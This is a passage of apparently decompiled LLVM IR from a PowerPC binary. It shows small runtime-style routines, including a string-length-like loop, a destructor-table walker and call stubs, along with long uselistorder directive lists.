  uselistorder i32 %v5_1000d29c, { 1, 0 }
  uselistorder i32 %v5_1000d29c21, { 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_1000d1ec, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder %0 (i32, i32)* @__asm_mtcrf, { 3, 4, 0, 5, 1, 2 }
  uselistorder i32 ()* @function_10007104, { 7, 6, 20, 19, 4, 3, 17, 16, 2, 24, 11, 10, 0, 14, 15, 1, 18, 9, 8, 5, 23, 22, 21, 13, 12 }
  uselistorder i32* @r5, { 20, 21, 22, 3, 23, 24, 38, 63, 64, 26, 27, 7, 5, 28, 1, 29, 39, 40, 41, 42, 43, 44, 65, 12, 45, 46, 47, 48, 49, 50, 6, 66, 67, 78, 8, 30, 31, 70, 71, 72, 9, 25, 51, 52, 53, 79, 80, 81, 82, 73, 74, 2, 75, 76, 77, 32, 54, 55, 56, 0, 57, 58, 59, 68, 69, 34, 35, 60, 61, 13, 62, 36, 4, 10, 11, 14, 15, 16, 17, 18, 19, 33, 37 }
  uselistorder i32* @r29, { 30, 31, 32, 33, 34, 129, 130, 1, 35, 12, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 16, 17, 18, 19, 20, 2, 47, 48, 49, 50, 51, 52, 53, 54, 65, 66, 67, 98, 131, 132, 55, 56, 57, 60, 61, 133, 134, 100, 101, 102, 99, 103, 14, 104, 105, 3, 106, 107, 108, 109, 110, 111, 135, 136, 137, 138, 139, 86, 87, 88, 89, 90, 22, 23, 91, 4, 92, 93, 94, 95, 96, 97, 62, 63, 64, 5, 140, 141, 142, 58, 59, 112, 113, 6, 114, 115, 116, 117, 68, 69, 13, 70, 71, 72, 73, 74, 75, 15, 7, 0, 76, 118, 119, 120, 121, 122, 123, 124, 127, 8, 11, 9, 128, 21, 125, 126, 143, 144, 145, 146, 77, 78, 79, 80, 81, 10, 82, 29, 83, 24, 25, 26, 27, 28, 84, 85 }
  uselistorder i32* @r28, { 2, 33, 34, 35, 36, 37, 38, 43, 44, 39, 40, 41, 42, 45, 46, 47, 48, 49, 50, 51, 52, 53, 12, 3, 11, 13, 14, 15, 16, 17, 18, 54, 58, 55, 56, 57, 1, 92, 93, 61, 62, 127, 128, 94, 4, 95, 96, 97, 98, 99, 5, 129, 130, 131, 132, 139, 22, 23, 24, 25, 26, 27, 28, 29, 30, 88, 89, 90, 91, 63, 64, 133, 134, 135, 136, 137, 59, 60, 100, 101, 65, 6, 66, 67, 68, 69, 70, 71, 72, 73, 102, 103, 104, 7, 105, 106, 8, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 0, 123, 124, 19, 20, 21, 138, 74, 75, 76, 77, 9, 78, 10, 79, 80, 81, 82, 83, 84, 85, 125, 126, 86, 87, 31, 32 }
  uselistorder i32 23, { 0, 4, 5, 6, 1, 2, 3 }
  uselistorder i32 18, { 1, 0, 2, 3, 4 }
  uselistorder i32 8, { 52, 53, 54, 55, 56, 57, 21, 22, 58, 59, 60, 61, 62, 63, 25, 26, 23, 15, 18, 19, 27, 28, 29, 30, 31, 64, 71, 72, 73, 20, 94, 65, 0, 74, 95, 96, 97, 98, 99, 100, 101, 102, 12, 103, 104, 105, 127, 128, 135, 138, 11, 41, 42, 13, 32, 14, 43, 83, 33, 87, 86, 84, 85, 34, 35, 36, 88, 89, 90, 91, 92, 93, 1, 66, 67, 68, 24, 49, 50, 16, 51, 132, 133, 134, 2, 139, 3, 136, 137, 69, 75, 76, 37, 77, 38, 106, 107, 108, 109, 110, 17, 111, 112, 113, 114, 4, 5, 115, 116, 6, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 10, 7, 129, 130, 131, 78, 79, 80, 81, 39, 40, 82, 8, 9, 44, 45, 46, 47, 48, 70 }
  uselistorder i32* @r30, { 44, 45, 46, 8, 47, 49, 51, 52, 53, 54, 55, 48, 50, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 20, 21, 22, 1, 23, 24, 25, 7, 26, 27, 70, 67, 68, 5, 69, 4, 115, 116, 117, 9, 118, 119, 120, 71, 72, 73, 74, 75, 76, 77, 18, 78, 79, 80, 81, 82, 83, 84, 85, 121, 122, 123, 124, 125, 10, 126, 127, 128, 129, 130, 11, 154, 155, 156, 157, 12, 108, 158, 169, 159, 160, 28, 0, 41, 13, 42, 43, 109, 110, 111, 29, 30, 31, 32, 33, 112, 113, 114, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 161, 162, 163, 164, 165, 166, 167, 14, 168, 131, 132, 96, 15, 97, 98, 101, 99, 100, 102, 103, 105, 104, 6, 106, 133, 134, 135, 136, 137, 2, 139, 19, 140, 16, 141, 142, 138, 143, 144, 145, 146, 147, 148, 149, 17, 150, 151, 3, 152, 153, 107, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* @cr4_eq, { 7, 5, 6, 0, 8, 2, 3, 9, 10, 1, 4 }
  uselistorder i1 false, { 1, 2, 4, 5, 6, 7, 8, 9, 0, 3, 10, 11, 12 }
  uselistorder i32* @r31, { 80, 2, 7, 81, 6, 82, 83, 84, 8, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 48, 51, 9, 42, 10, 11, 52, 53, 54, 99, 100, 101, 102, 1, 103, 104, 105, 106, 107, 108, 109, 110, 219, 220, 221, 222, 223, 141, 12, 142, 143, 144, 145, 13, 146, 147, 148, 149, 150, 151, 224, 225, 226, 227, 228, 229, 230, 231, 232, 14, 233, 15, 275, 276, 277, 16, 112, 111, 3, 114, 115, 116, 117, 118, 119, 120, 121, 62, 63, 64, 65, 152, 17, 153, 154, 18, 155, 156, 19, 157, 158, 234, 235, 236, 237, 238, 20, 239, 240, 241, 242, 21, 243, 22, 244, 245, 246, 47, 247, 0, 278, 279, 280, 23, 49, 281, 43, 206, 24, 207, 287, 288, 45, 75, 282, 285, 286, 78, 79, 55, 56, 57, 58, 59, 76, 77, 4, 208, 209, 210, 211, 212, 213, 66, 67, 68, 214, 215, 216, 217, 218, 122, 123, 124, 26, 125, 126, 127, 25, 128, 129, 130, 131, 132, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 27, 113, 28, 248, 133, 134, 135, 30, 136, 29, 137, 159, 160, 161, 31, 162, 163, 164, 165, 166, 167, 168, 169, 32, 46, 170, 5, 171, 172, 138, 139, 140, 33, 173, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 36, 35, 265, 34, 269, 270, 37, 271, 272, 273, 274, 60, 61, 267, 266, 268, 283, 38, 284, 50, 39, 44, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 186, 185, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 69, 70, 71, 72, 73, 74, 201, 202, 203, 204, 40, 41, 205 }
  uselistorder i32* @r23, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 12, 11, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r24, { 3, 4, 7, 5, 6, 8, 9, 10, 0, 11, 12, 13, 14, 15, 2, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* @r6, { 2, 3, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 4, 16, 1, 17, 5 }
  uselistorder i32* @r25, { 3, 4, 5, 7, 8, 6, 9, 1, 2, 10, 11, 12, 13, 14, 15, 16, 17, 18, 27, 30, 19, 20, 21, 22, 0, 23, 24, 25, 26, 28, 29 }
  uselistorder i32* @r26, { 1, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 15, 16, 17, 18, 19, 3, 4, 20, 21, 22, 23, 24, 2, 25, 26, 27, 28, 29, 30, 31, 32, 33, 49, 50, 72, 48, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 69, 51, 52, 53, 54, 55, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 0, 70, 71, 46, 67, 68, 47 }
  uselistorder i32 ()* @__asm_mfcr, { 27, 22, 18, 26, 25, 12, 17, 35, 11, 34, 9, 30, 8, 7, 6, 5, 4, 33, 3, 2, 1, 24, 29, 38, 21, 32, 16, 15, 31, 10, 28, 23, 14, 37, 13, 36, 19, 20, 0 }
  uselistorder label %dec_label_pc_1000d2c0, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000d2b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d298, { 1, 0 }
  uselistorder label %dec_label_pc_1000d294, { 1, 0 }
  uselistorder label %dec_label_pc_1000d284, { 1, 0 }
  uselistorder label %dec_label_pc_1000d240, { 1, 0 }
  uselistorder label %dec_label_pc_1000d228, { 1, 0 }
  uselistorder label %dec_label_pc_1000d220, { 1, 0 }
}

define i32 @function_1000d2dc() local_unnamed_addr {
dec_label_pc_1000d2dc:
  %r11.global-to-local = alloca i32, align 4
  %v0_1000d2dc = load i32, i32* @r3, align 4
  store i32 %v0_1000d2dc, i32* %r11.global-to-local, align 4
  %v3_1000d2dc = icmp eq i32 %v0_1000d2dc, 0
  %v0_1000d2e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d2dc, i32 %v0_1000d2e4)
  %v0_1000d2f4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000d300

dec_label_pc_1000d2ec:                            ; preds = %dec_label_pc_1000d2fc
  %v1_1000d2ec = add i32 %v1_1000d300, 2
  br label %dec_label_pc_1000d31c

dec_label_pc_1000d2fc:                            ; preds = %dec_label_pc_1000d300
  %v2_1000d314 = add i32 %v1_1000d304, %v5_1000d300
  %v3_1000d310 = icmp eq i32 %v1_1000d30c, 192
  br i1 %v3_1000d310, label %dec_label_pc_1000d2ec, label %dec_label_pc_1000d300

dec_label_pc_1000d300:                            ; preds = %dec_label_pc_1000d2fc, %dec_label_pc_1000d2dc
  %v1_1000d300 = phi i32 [ %v2_1000d314, %dec_label_pc_1000d2fc ], [ %v0_1000d2f4, %dec_label_pc_1000d2dc ]
  %v0_1000d300 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000d300 = add i32 %v0_1000d300, %v1_1000d300
  %v3_1000d300 = inttoptr i32 %v2_1000d300 to i8*
  %v4_1000d300 = load i8, i8* %v3_1000d300, align 1
  %v5_1000d300 = zext i8 %v4_1000d300 to i32
  %v1_1000d304 = add i32 %v1_1000d300, 1
  %v3_1000d308 = icmp eq i8 %v4_1000d300, 0
  %v1_1000d30c = call i32 @__asm_rlwinm(i32 %v5_1000d300, i32 0, i32 24, i32 25)
  br i1 %v3_1000d308, label %dec_label_pc_1000d31c, label %dec_label_pc_1000d2fc

dec_label_pc_1000d31c:                            ; preds = %dec_label_pc_1000d300, %dec_label_pc_1000d2ec
  %v1_1000d31c = phi i32 [ %v1_1000d2ec, %dec_label_pc_1000d2ec ], [ %v1_1000d304, %dec_label_pc_1000d300 ]
  %v0_1000d31c = load i32, i32* @r4, align 4
  %v2_1000d31c = sub i32 %v1_1000d31c, %v0_1000d31c
  ret i32 %v2_1000d31c

; uselistorder directives
  uselistorder i32 %v1_1000d304, { 1, 0 }
  uselistorder i32 %v5_1000d300, { 1, 0 }
  uselistorder i32 %v1_1000d300, { 2, 1, 0 }
  uselistorder i32 %v0_1000d2dc, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 0, 61, 4, 35, 45, 46, 47, 5, 62, 63, 1, 43, 2, 44, 19, 20, 21, 64, 65, 66, 48, 33, 36, 37, 3, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 38, 39, 40, 41, 42, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 67 }
  uselistorder i32 25, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 24, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 20, 29, 16, 17, 18, 21, 22, 23, 30, 0, 28, 1, 31, 19, 24, 25, 26, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 27, 2, 3, 4, 5, 6 }
  uselistorder i8 0, { 33, 30, 4, 34, 1, 35, 36, 5, 6, 7, 8, 9, 25, 40, 38, 24, 39, 37, 23, 41, 42, 43, 44, 46, 45, 26, 10, 47, 48, 11, 12, 49, 50, 28, 53, 51, 52, 27, 54, 55, 13, 57, 56, 29, 58, 31, 0, 59, 60, 61, 62, 2, 14, 63, 65, 66, 67, 68, 64, 69, 15, 70, 71, 72, 73, 16, 17, 18, 19, 20, 75, 76, 77, 78, 74, 79, 3, 21, 80, 82, 81, 22, 83, 84, 85, 86, 87, 88, 91, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 112, 111, 32, 113, 114, 115 }
  uselistorder i32 192, { 0, 1, 3, 2 }
  uselistorder i32 2, { 0, 31, 5, 88, 51, 89, 90, 32, 1, 2, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 6, 103, 7, 79, 80, 81, 33, 30, 104, 105, 106, 107, 108, 52, 53, 34, 117, 118, 135, 43, 8, 9, 3, 54, 109, 10, 11, 35, 112, 113, 42, 119, 120, 12, 121, 122, 123, 136, 55, 56, 82, 57, 83, 58, 84, 137, 36, 13, 14, 15, 46, 49, 50, 59, 60, 110, 47, 4, 37, 138, 16, 17, 38, 39, 61, 62, 41, 40, 124, 125, 114, 115, 126, 127, 128, 18, 19, 20, 21, 22, 129, 130, 23, 132, 133, 134, 29, 131, 116, 63, 24, 139, 26, 25, 48, 65, 64, 67, 66, 69, 68, 85, 44, 71, 45, 86, 70, 87, 73, 72, 111, 27, 28, 75, 74, 76, 77, 78 }
  uselistorder i32* @r4, { 35, 36, 1, 37, 38, 39, 40, 2, 41, 42, 43, 44, 10, 11, 45, 46, 47, 48, 49, 50, 51, 79, 102, 103, 52, 53, 55, 56, 57, 7, 58, 59, 60, 61, 62, 15, 12, 80, 81, 82, 83, 84, 85, 86, 87, 113, 8, 9, 105, 14, 31, 32, 16, 17, 63, 64, 70, 71, 106, 107, 108, 54, 3, 88, 89, 90, 13, 91, 92, 65, 66, 67, 68, 69, 72, 73, 74, 4, 5, 112, 93, 94, 95, 0, 96, 97, 98, 104, 99, 100, 30, 101, 6, 18, 19, 109, 110, 111, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 33, 34, 75, 76, 77, 78 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 15, 25, 12, 1, 17, 18, 19, 20, 21, 26, 16, 22, 13, 14, 28, 27, 23, 24, 2 }
}

define i32 @function_1000d324(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000d324:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r31.global-to-local, align 4
  %v3_1000d340 = load i32, i32* @global_var_10010000.2, align 4
  %v3_1000d344 = icmp eq i32 %v3_1000d340, -1
  br i1 %v3_1000d344, label %dec_label_pc_1000d360, label %dec_label_pc_1000d34c

dec_label_pc_1000d34c:                            ; preds = %dec_label_pc_1000d324, %dec_label_pc_1000d34c
  %v0_1000d34c = phi i32 [ %v3_1000d354, %dec_label_pc_1000d34c ], [ %v3_1000d340, %dec_label_pc_1000d324 ]
  call void @__pseudo_call(i32 %v0_1000d34c)
  %v0_1000d354 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d354 = add i32 %v0_1000d354, -4
  %v2_1000d354 = inttoptr i32 %v1_1000d354 to i32*
  %v3_1000d354 = load i32, i32* %v2_1000d354, align 4
  store i32 %v1_1000d354, i32* %r31.global-to-local, align 4
  %v3_1000d358 = icmp eq i32 %v3_1000d354, -1
  br i1 %v3_1000d358, label %dec_label_pc_1000d360, label %dec_label_pc_1000d34c

dec_label_pc_1000d360:                            ; preds = %dec_label_pc_1000d34c, %dec_label_pc_1000d324
  %v0_1000d370 = load i32, i32* @r3, align 4
  ret i32 %v0_1000d370

; uselistorder directives
  uselistorder i32 %v3_1000d354, { 1, 0 }
  uselistorder i32 -4, { 2, 21, 22, 23, 14, 15, 16, 17, 18, 24, 25, 3, 4, 5, 6, 7, 8, 9, 10, 11, 20, 19, 33, 34, 30, 31, 32, 26, 27, 28, 29, 12, 13, 0, 1 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 2, 0 }
  uselistorder i32 -1, { 197, 198, 16, 43, 53, 229, 230, 54, 285, 120, 231, 55, 232, 47, 56, 233, 57, 234, 199, 200, 108, 109, 59, 58, 201, 44, 45, 202, 203, 204, 159, 65, 63, 61, 205, 206, 207, 64, 62, 60, 208, 209, 160, 210, 161, 235, 26, 27, 162, 236, 163, 48, 270, 66, 286, 121, 3, 4, 287, 288, 49, 289, 290, 67, 68, 0, 164, 328, 30, 31, 32, 329, 165, 333, 28, 29, 211, 332, 220, 237, 33, 238, 239, 240, 124, 241, 242, 243, 244, 245, 246, 247, 122, 248, 123, 249, 250, 251, 252, 166, 291, 167, 5, 50, 168, 292, 293, 169, 170, 171, 294, 172, 253, 254, 173, 255, 256, 174, 271, 272, 273, 46, 295, 296, 297, 118, 51, 298, 299, 300, 301, 125, 302, 6, 69, 303, 304, 305, 306, 307, 175, 308, 126, 309, 310, 127, 7, 8, 128, 129, 311, 176, 218, 177, 312, 313, 314, 315, 70, 71, 330, 331, 72, 281, 130, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 334, 84, 336, 335, 85, 221, 222, 131, 178, 223, 36, 37, 179, 224, 34, 35, 180, 226, 9, 132, 86, 212, 10, 87, 52, 225, 38, 39, 181, 133, 110, 88, 213, 282, 283, 42, 182, 257, 111, 258, 259, 134, 263, 89, 90, 227, 337, 338, 316, 91, 183, 184, 260, 261, 185, 262, 186, 187, 116, 188, 189, 190, 191, 192, 40, 193, 135, 92, 93, 264, 265, 266, 274, 112, 275, 276, 277, 17, 18, 19, 20, 21, 22, 23, 113, 114, 317, 15, 318, 11, 319, 320, 194, 136, 24, 195, 321, 322, 1, 324, 325, 2, 137, 138, 196, 41, 139, 119, 326, 140, 323, 278, 12, 25, 115, 141, 13, 219, 327, 142, 279, 143, 280, 144, 94, 95, 96, 97, 98, 99, 214, 100, 101, 102, 339, 215, 216, 217, 145, 146, 147, 148, 149, 103, 150, 228, 104, 151, 152, 267, 107, 106, 105, 268, 153, 269, 154, 155, 156, 157, 14, 117, 284, 158 }
  uselistorder i32 ptrtoint (i32* @global_var_10010000.2 to i32), { 51, 52, 53, 54, 55, 56, 0, 57, 58, 59, 36, 37, 1, 60, 3, 2, 38, 4, 61, 39, 62, 40, 63, 64, 65, 66, 67, 41, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 42, 43, 44, 7, 5, 6, 45, 8, 9, 10, 11, 12, 13, 14, 80, 81, 82, 16, 83, 84, 15, 85, 20, 19, 17, 18, 46, 23, 22, 21, 26, 24, 25, 27, 47, 32, 28, 29, 48, 30, 31, 33, 34, 35, 49, 50 }
  uselistorder i32 1, { 216, 743, 341, 744, 745, 746, 747, 748, 749, 177, 176, 750, 456, 751, 752, 54, 55, 53, 56, 399, 753, 308, 263, 508, 173, 174, 754, 395, 755, 400, 758, 759, 760, 761, 762, 457, 763, 764, 765, 34, 33, 38, 37, 36, 35, 39, 32, 40, 766, 767, 768, 509, 15, 18, 16, 19, 17, 20, 769, 13, 14, 770, 234, 771, 272, 274, 273, 271, 388, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 511, 510, 319, 316, 315, 320, 317, 318, 681, 682, 683, 684, 512, 505, 172, 161, 170, 160, 166, 167, 169, 165, 163, 164, 162, 168, 171, 408, 772, 773, 391, 774, 775, 776, 777, 778, 779, 513, 117, 116, 118, 115, 119, 447, 783, 780, 781, 782, 514, 157, 154, 155, 151, 153, 156, 152, 686, 687, 688, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 69, 66, 68, 67, 63, 64, 71, 65, 72, 70, 401, 689, 158, 57, 52, 233, 402, 880, 77, 74, 75, 73, 76, 114, 881, 516, 515, 112, 111, 113, 298, 376, 947, 458, 459, 518, 517, 269, 266, 270, 268, 265, 267, 0, 460, 521, 520, 519, 289, 290, 522, 523, 798, 389, 799, 803, 804, 805, 806, 807, 525, 524, 342, 343, 344, 345, 808, 809, 810, 384, 811, 812, 409, 813, 814, 428, 429, 461, 410, 424, 815, 463, 433, 816, 817, 464, 818, 819, 820, 462, 531, 530, 529, 528, 498, 527, 526, 133, 132, 127, 129, 130, 126, 131, 128, 134, 1, 821, 822, 823, 824, 411, 125, 690, 691, 120, 121, 692, 184, 187, 186, 185, 183, 882, 299, 300, 301, 304, 303, 302, 883, 884, 403, 885, 237, 239, 238, 250, 253, 248, 252, 251, 249, 465, 859, 860, 499, 123, 122, 124, 468, 886, 887, 888, 466, 889, 467, 890, 891, 892, 893, 894, 541, 540, 539, 538, 537, 536, 535, 534, 533, 500, 532, 94, 91, 93, 90, 92, 86, 99, 95, 89, 96, 85, 88, 100, 87, 98, 97, 84, 83, 82, 895, 448, 107, 110, 109, 108, 106, 101, 102, 105, 104, 103, 59, 58, 60, 948, 949, 4, 5, 3, 896, 897, 542, 351, 348, 350, 352, 353, 349, 412, 898, 545, 544, 543, 182, 309, 159, 546, 260, 259, 321, 212, 379, 378, 254, 217, 262, 547, 322, 548, 261, 307, 469, 549, 211, 470, 435, 434, 717, 553, 552, 551, 550, 244, 243, 241, 245, 242, 246, 950, 556, 555, 554, 198, 197, 199, 196, 951, 557, 724, 725, 726, 449, 727, 413, 147, 149, 144, 146, 143, 148, 150, 145, 685, 47, 43, 41, 44, 42, 45, 46, 48, 718, 414, 719, 558, 336, 335, 334, 337, 338, 339, 340, 180, 179, 181, 178, 279, 275, 278, 277, 280, 282, 276, 281, 559, 560, 561, 247, 563, 562, 283, 284, 285, 61, 62, 220, 219, 218, 292, 291, 396, 564, 346, 436, 565, 566, 567, 568, 569, 570, 571, 572, 450, 451, 825, 415, 471, 826, 827, 437, 836, 575, 574, 573, 228, 226, 227, 225, 229, 224, 222, 223, 230, 221, 231, 232, 576, 577, 729, 730, 731, 732, 416, 733, 734, 200, 207, 208, 201, 209, 206, 210, 202, 203, 204, 205, 952, 579, 578, 383, 581, 580, 190, 189, 191, 582, 800, 756, 757, 899, 900, 583, 354, 356, 355, 357, 472, 901, 828, 829, 830, 831, 832, 833, 834, 835, 293, 294, 296, 295, 297, 839, 837, 838, 840, 841, 902, 903, 904, 842, 392, 81, 80, 79, 802, 801, 960, 961, 326, 323, 325, 324, 956, 957, 958, 959, 381, 382, 380, 192, 473, 843, 844, 845, 501, 139, 138, 140, 438, 861, 862, 863, 425, 404, 137, 136, 135, 864, 584, 78, 417, 474, 865, 586, 585, 587, 313, 312, 846, 847, 588, 51, 50, 49, 589, 194, 195, 193, 590, 188, 905, 906, 476, 907, 908, 909, 910, 911, 912, 914, 915, 916, 477, 917, 918, 418, 919, 475, 920, 478, 921, 922, 923, 913, 594, 593, 592, 591, 31, 25, 27, 24, 28, 22, 21, 29, 23, 30, 26, 924, 925, 926, 927, 928, 362, 363, 358, 360, 359, 364, 361, 479, 310, 311, 929, 930, 11, 10, 12, 9, 932, 419, 933, 397, 420, 935, 936, 937, 938, 421, 940, 422, 939, 934, 480, 502, 601, 600, 599, 598, 597, 596, 595, 367, 369, 372, 374, 365, 373, 371, 370, 368, 375, 366, 405, 406, 327, 328, 329, 931, 439, 503, 481, 215, 214, 213, 954, 440, 955, 866, 867, 868, 869, 870, 871, 407, 603, 602, 7, 6, 8, 441, 605, 604, 287, 288, 286, 607, 606, 314, 609, 608, 332, 333, 331, 611, 610, 872, 873, 613, 612, 142, 256, 240, 255, 175, 330, 377, 235, 347, 257, 953, 614, 236, 693, 694, 695, 696, 697, 698, 484, 430, 699, 700, 387, 482, 483, 485, 701, 486, 702, 703, 385, 423, 704, 621, 620, 619, 618, 617, 616, 615, 487, 442, 443, 444, 488, 489, 624, 623, 622, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 626, 625, 504, 141, 720, 721, 633, 632, 631, 630, 629, 628, 627, 722, 723, 642, 641, 640, 639, 638, 637, 636, 635, 634, 728, 431, 646, 645, 644, 643, 490, 735, 398, 736, 737, 386, 738, 650, 649, 648, 647, 306, 305, 739, 740, 741, 742, 848, 849, 491, 850, 851, 852, 492, 394, 853, 493, 854, 657, 656, 655, 654, 653, 652, 651, 264, 426, 390, 855, 427, 445, 856, 494, 858, 393, 432, 857, 495, 496, 497, 665, 664, 663, 662, 661, 660, 659, 658, 874, 875, 666, 876, 877, 446, 878, 2, 879, 667, 453, 941, 942, 452, 943, 944, 454, 455, 945, 946, 669, 668, 258, 506, 507 }
  uselistorder label %dec_label_pc_1000d34c, { 1, 0 }
}

define i32 @function_1000d374() local_unnamed_addr {
dec_label_pc_1000d374:
  %v0_1000d38c = load i32, i32* @r3, align 4
  ret i32 %v0_1000d38c

; uselistorder directives
  uselistorder i32* @r3, { 47, 29, 143, 144, 147, 145, 146, 0, 148, 149, 13, 150, 14, 151, 55, 56, 57, 152, 153, 154, 15, 64, 65, 16, 34, 241, 242, 243, 236, 286, 287, 288, 155, 156, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 17, 173, 174, 175, 176, 177, 178, 179, 180, 181, 66, 67, 18, 68, 69, 70, 46, 244, 245, 246, 247, 248, 19, 31, 249, 250, 251, 252, 253, 254, 3, 2, 255, 256, 257, 38, 54, 300, 4, 41, 5, 48, 53, 294, 295, 296, 112, 113, 114, 115, 116, 117, 118, 119, 58, 59, 60, 61, 62, 232, 233, 71, 52, 72, 28, 32, 237, 238, 182, 183, 184, 185, 186, 187, 188, 189, 128, 129, 130, 131, 132, 133, 6, 33, 36, 297, 298, 51, 157, 30, 7, 258, 259, 260, 261, 262, 44, 299, 37, 190, 191, 198, 199, 200, 201, 202, 203, 204, 35, 205, 206, 207, 208, 209, 73, 74, 192, 193, 210, 211, 101, 102, 263, 39, 264, 265, 266, 8, 12, 9, 267, 10, 268, 11, 269, 270, 271, 272, 273, 274, 40, 275, 276, 277, 278, 279, 280, 63, 289, 290, 291, 292, 293, 212, 213, 214, 215, 216, 217, 218, 219, 103, 104, 105, 106, 50, 107, 108, 109, 110, 111, 281, 282, 283, 220, 221, 222, 223, 224, 225, 226, 75, 76, 45, 77, 78, 79, 20, 80, 21, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 22, 92, 93, 94, 26, 25, 95, 96, 97, 98, 24, 23, 99, 100, 120, 121, 122, 123, 124, 125, 126, 127, 134, 135, 136, 27, 137, 138, 139, 140, 141, 142, 194, 195, 196, 1, 197, 227, 228, 229, 231, 230, 234, 235, 239, 240, 284, 285, 42, 43, 49 }
}

define i32 @function_1000d390() local_unnamed_addr {
entry:
  store i32 268489632, i32* @lr, align 4
  %v0_1000d39c = call i32 @function_100000b8()
  ret i32 %v0_1000d39c

; uselistorder directives
  uselistorder i32 0, { 562, 563, 37, 566, 101, 564, 565, 63, 567, 568, 569, 572, 570, 0, 571, 573, 1, 100, 574, 172, 711, 27, 801, 802, 590, 577, 580, 581, 582, 260, 583, 584, 586, 585, 587, 588, 589, 591, 592, 593, 575, 576, 578, 579, 102, 594, 596, 597, 595, 598, 599, 600, 601, 215, 394, 602, 395, 216, 396, 103, 104, 402, 403, 89, 404, 405, 406, 407, 408, 409, 410, 105, 173, 412, 411, 106, 413, 414, 108, 107, 415, 261, 416, 417, 418, 110, 109, 419, 420, 221, 262, 421, 111, 603, 604, 605, 606, 611, 607, 67, 612, 613, 608, 609, 610, 64, 65, 66, 614, 263, 38, 39, 40, 210, 616, 617, 618, 619, 112, 615, 264, 620, 621, 622, 90, 41, 623, 174, 624, 625, 626, 433, 175, 803, 804, 712, 713, 714, 715, 716, 717, 718, 805, 28, 806, 114, 113, 807, 808, 809, 810, 115, 719, 720, 721, 722, 811, 812, 813, 814, 815, 816, 817, 818, 29, 627, 1000, 265, 1003, 70, 266, 222, 1004, 267, 1007, 1008, 68, 69, 1009, 2, 3, 397, 1001, 1002, 223, 268, 636, 628, 269, 71, 629, 630, 632, 42, 634, 635, 637, 638, 639, 640, 641, 642, 224, 212, 213, 271, 643, 644, 645, 647, 176, 650, 272, 225, 652, 653, 654, 655, 270, 226, 649, 646, 648, 651, 656, 217, 657, 658, 659, 4, 660, 661, 662, 117, 116, 663, 5, 118, 227, 434, 119, 435, 436, 6, 819, 820, 178, 822, 821, 60, 7, 823, 177, 8, 824, 180, 825, 61, 9, 826, 179, 664, 665, 666, 667, 668, 669, 670, 723, 724, 725, 273, 726, 727, 728, 827, 828, 829, 830, 831, 274, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 120, 121, 845, 846, 847, 848, 849, 850, 851, 852, 853, 43, 854, 122, 85, 855, 856, 857, 858, 859, 123, 860, 861, 862, 863, 864, 865, 866, 867, 868, 124, 869, 870, 871, 253, 254, 872, 873, 874, 30, 10, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 91, 1010, 1011, 1012, 1015, 1013, 11, 181, 12, 484, 896, 895, 182, 894, 92, 897, 898, 899, 125, 900, 485, 1005, 1006, 773, 774, 228, 775, 486, 1016, 126, 1017, 500, 1018, 1019, 1020, 1021, 1022, 487, 1023, 1024, 1025, 706, 275, 276, 